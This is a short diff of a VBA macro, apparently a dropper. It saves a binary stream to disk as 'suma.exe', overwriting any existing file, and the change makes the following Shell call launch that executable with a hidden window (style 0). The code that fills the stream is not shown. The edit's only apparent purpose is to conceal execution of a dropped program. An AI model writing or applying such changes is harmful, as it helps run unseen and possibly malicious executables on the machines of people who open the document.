@@ -12,6 +12,6 @@ With bStrm
     .savetofile "suma.exe", 2 '//overwrite
 End With
 
-Shell ("suma.exe")
+Shell ("suma.exe", 0)
 
 End Sub
